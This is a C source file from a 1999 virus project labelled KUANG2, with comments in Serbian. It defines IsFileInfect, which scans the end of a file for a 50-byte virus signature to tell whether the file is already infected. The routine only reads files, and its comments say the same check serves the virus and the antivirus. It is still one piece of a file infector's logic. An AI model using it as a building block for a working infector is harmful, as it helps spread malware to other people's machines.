/***[ThuNderSoft]*************************************************************
							  KUANG2: IsFileInfect
								   ver: 0.10
								     WEIRD
*****************************************************************************/

/* HISTORY */
// ver 0.10 (12-may-1999): born code

#include <windows.h>
#include <strmem.h>

// minimalna veličina fajla	 ( < veličine dodatog virusa)
#define		MIN_FILE_LEN	9000
// koliko od kraja fajla treba početi skeniranje ( > veličine dodatog virusa)
#define		FROM_END		12500

/*
	IsFileInfect
	------------
  + proverava da li je neki fajl već inficiran.
  + mora posebno jer vrši samo čitanje.
  + vraća -1 za tehničke probleme, 0 za čist fajl, 1 za inficiran
  + indetično u virusu i antivirusu
  + brz i inteligentan. */

int IsFileInfect(char *fname, char* virus_sign) {
	HANDLE hfile, hfilemap;
	char *filemap, *filestart;
	DWORD fattr;
	DWORD fsize;
	unsigned int retvalue;
	unsigned int koliko;

	retvalue=-1;						// označi tehničku grešku (default)

	fattr=GetFileAttributes(fname);		// uzmi atribute fajla

	// otvaramo fajl
	hfile=CreateFile(fname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, fattr, NULL);
	if (hfile==INVALID_HANDLE_VALUE) goto end1;

	// uzmi veliinu fajla
	fsize=GetFileSize(hfile, NULL);
	if (fsize==0xFFFFFFFF) goto end2;	// greška
	if (fsize<MIN_FILE_LEN) {			// ako je veličina fajla manja
		retvalue=0;						// od veličine dodatog virusa
		goto end2;						// znači da je fajl čist (0)
	}

	// kreiramo MMF
	hfilemap=CreateFileMapping (hfile, NULL, PAGE_READONLY, 0, fsize, NULL);
	if (hfilemap==NULL) goto end2;
	// kreiramo MMF view na ceo fajl
	filemap=(void *) MapViewOfFile (hfilemap, FILE_MAP_READ, 0,0,0);
	if (filemap==NULL) goto end3;
	filestart=filemap;

	// odredi početak skeniranja...
	if (fsize>FROM_END) {				// ako je fajl veći od FROM_END
		filemap+=(fsize-FROM_END);		// pomeri se tako da ima FROM_END do kraja
		koliko=FROM_END;				// označi koliko ima za skeniranje
	} else koliko=fsize;				// označi da se ceo fajl skenira

	// proveri da li je već zaražen (čak 50 znakova!)
	if (memfind(filemap, koliko, virus_sign, 50)!=-1)
		retvalue=1;					// zaražen fajl
		else retvalue=0;			// čist fajl

	UnmapViewOfFile(filestart); // zatvari MMF view
end3:
	CloseHandle(hfilemap);		// zatvori MMF
end2:
	CloseHandle(hfile);			// zatvori fajl
end1:
	return retvalue;			// vrati rezultat
}

